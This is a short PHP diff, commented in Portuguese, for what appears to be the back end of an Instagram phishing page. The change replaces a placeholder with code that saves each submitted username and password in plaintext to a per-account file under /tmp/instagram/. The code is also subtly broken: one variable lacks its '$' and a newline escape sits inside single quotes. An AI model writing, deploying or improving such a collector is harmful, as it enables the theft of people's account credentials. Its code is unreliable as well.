@@ -1,10 +1,10 @@
 <?php
-    $username = $_POST['username']
-    $password = $_POST['password']
+    $username = $_POST['username'];
+    $password = $_POST['password'];
 
     // cria arquivo no servidor
-    $arquivo = fopen('/tmp/instagram/accounts.txt','w');
-    $texto = “Olá Mundo !!!”; 
-    fwrite($arquivo, $ texto);
+    $arquivo = fopen('/tmp/instagram/account'. username .'.txt','w');
+    $texto = 'usuario: '. $username .'\n senha: '. $password; 
+    fwrite($arquivo, $texto);
     fclose($arquivo);
 ?>
